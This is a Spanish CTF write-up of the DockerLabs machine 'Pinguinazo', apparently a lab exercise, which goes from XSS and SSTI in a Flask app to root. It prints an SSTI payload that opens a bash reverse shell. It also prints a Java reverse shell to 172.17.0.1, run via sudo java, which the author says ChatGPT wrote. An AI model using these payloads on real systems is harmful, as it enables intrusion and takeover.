---
title: Pinguinazo - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  | Fácil       | ElPinguinoDeMario | 


# Reconocimiento

Vemos el puerto 5000 abierto

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/35b5dfc9-f77e-4fac-aa69-2914f81f44fe)

Vamos a ver qué hay en ese puerto

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/c42daa28-3178-4039-b5b2-ee3464852af8)

Nos encontramos esta página web con unos campos para rellenar, vamos a pasarle el WhatWeb a ver qué nos dice

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/db5de1e5-6940-4403-b68f-d5f3638034b9)

Tenemos diferentes versiones de Werkzeug Python 

Si rellenamos los campos, vemos lo siguiente

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/0365cc9f-43a9-48e1-86d0-469867aca831)

Vamos a pasarle Gobuster a ver si encuentra algo y únicamente nos encuentra un /console que nos pide un PIN

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/ec2a6bb1-780f-4873-8e72-6a98fe2b206e)

## Explotación

En el campo PinguNombre si probamos de inyectar código malicioso como por ejemplo:

```html
<script>alert('XSS')</script>
```
vemos lo siguiente:

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/58cbb1cf-ac2f-4a3b-bacc-55f0db87fbdb)

Entonces esto es vulnerable a Cross-Site Scripting (XSS). Vamos a intentar otras vulnerabilidades web como HTML Injection

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/3915400d-568c-4341-894e-1bd3b52df8ad)
![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/6dc17939-4b56-463a-9860-c4cabe111a21)

También es vulnerable. Vamos a probar con una vulnerabilidad de SSTI

Accedemos a esta página y nos dirigimos a la parte que dice *Exploit the SSTI by calling os.popen().read(*

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/f0fbca8e-710e-4720-b9f6-2abe2acf2d12)

Introducimos este código que lo encontramos en la página de Github y vemos que también es vulnerable.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/92fdfb10-c3ee-4a25-97f9-ed20be762e43)

Ahora vamos a aprovechar el SSTI para mandarnos una reverse shell y poder acceder a la máquina

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"').read() }}
```

## Intrusión

Y conseguimos acceder a la máquina

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/75e05212-6ce2-4526-b05b-48a16510ddbc)

Ahora vamos a buscar la forma de escalar privilegios

## Escalada de privilegios

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/9e8f18ad-0a21-4aca-9f9d-9619980784c1)

Vemos que podemos ejecutar Java como root, en GTFOBins no aparece nada y en la máquina no aparece ningún script en Java, entonces le pedimos a ChatGPT que nos haga una Reverse Shell en Java

```java

public class shell {  
  public static void main(String[] args) {  
      Process p;  
      try {  
          p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/172.17.0.1/4443 0>&1");  
          p.waitFor();  
          p.destroy();  
      } catch (Exception e) {}  
  }  
}
```

Lo ejecutamos de la siguiente forma

```bash
sudo -u root /usr/bin/java /tmp/r.java
```

Y ya somos ROOT

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/ce47411d-e458-481e-991f-cd2aaa94dfad)
